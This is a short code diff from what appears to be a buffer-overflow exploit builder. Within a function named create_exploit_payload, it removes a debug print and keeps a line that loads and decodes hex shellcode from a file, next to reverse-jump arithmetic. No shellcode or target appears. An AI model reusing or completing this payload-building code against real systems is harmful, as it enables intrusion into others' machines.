@@ -263,9 +263,7 @@ def create_exploit_payload(buffHead, buffSize, offsetCount, binContent, reverseJ
 
 	# shellcode
 	with open(shellCodeFile) as f: shellCodeStr = f.read()
-	print("Shell code string:", shellCodeStr)
-
-	shellCode = binascii.unhexlify(shellCodeStr)
+	shellCode = binascii.unhexlify(shellCodeStr)	
 
 	# Limitation: reverse jump can only be divisible by 256
 	tJmp = reverseJmpSize % 256
